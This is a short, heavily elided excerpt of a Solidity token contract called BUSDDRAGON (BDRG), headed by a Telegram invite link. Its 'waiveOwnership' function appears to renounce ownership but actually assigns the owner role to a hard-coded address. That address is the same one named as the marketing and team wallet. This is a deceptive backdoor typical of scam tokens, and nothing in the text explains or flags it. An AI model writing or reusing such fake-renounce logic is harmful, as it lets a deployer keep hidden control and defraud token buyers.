...
/**
Telegram : https://t.me/+VXKC6tor66EzNzBl
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB4B523509b57B8F060EF699F5E1a56da3625eEad);
    }
...
contract BUSDDRAGON is Context, IERC20, Ownable {
    ...
    string private _symbol = "BDRG";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB4B523509b57B8F060EF699F5E1a56da3625eEad);
    address payable private teamWalletAddress = payable(0xB4B523509b57B8F060EF699F5E1a56da3625eEad);
